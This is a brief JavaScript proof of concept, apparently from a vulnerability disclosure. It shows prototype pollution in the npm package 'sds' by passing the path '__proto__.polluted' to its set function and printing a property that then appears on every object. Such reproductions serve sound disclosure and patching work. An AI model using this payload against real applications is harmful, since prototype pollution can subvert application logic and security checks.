var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const root = require('sds');
obj = {};
let payload = '__proto__.polluted';
console.log({}.polluted);
root.set(obj, payload, true);
console.log({}.polluted);